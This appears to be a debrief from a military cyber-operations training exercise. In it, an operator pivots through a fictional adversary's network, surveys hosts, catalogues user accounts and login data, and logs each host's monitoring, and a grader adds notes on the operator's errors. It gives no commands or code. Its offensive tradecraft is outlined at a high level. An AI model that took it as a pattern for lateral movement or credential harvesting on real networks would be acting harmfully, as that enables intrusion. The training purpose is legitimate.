***MISSION DEBRIEF***
Operator: LCpl Bonestroo
Operation: BB02
MC: MC2
Analyst: Analyst2
Description: The goal of this operation was to perform survey of listed user devices within the Krasnovian 3rd Armour BDE internal network (192.186.169.0/24). The operation was an overall success. Operator redirected from EXT_RTR to CHATSVR to Vyos2 to ADMIN2 to T5 back out to T4 to T6 back to T4 then finally to T7 before exit vetting and disconnecting from the network. T1 had remote logging. T2 had abnormal logging and a privileged user. T3 appeared to be a clean box. T4 didn't have anything that wasn't already in the NSDB; operator was not able to conduct device survey due to NSDB restriction. T5 has a privileged user, abnormal logging, and remote logging; operator was told by EA to not conduct a device survey, operator did catalog user accounts and login data. T6 had a privileged user, remote logging, and malware; operator conducted a device survey, cataloged user accounts and login data. T7 had a security product; operator conducted a device survey, cataloged user accounts and login data.


Result: Passed

Notes:
Did not name survey file correctly
DId not notify analyst of user survey on T7
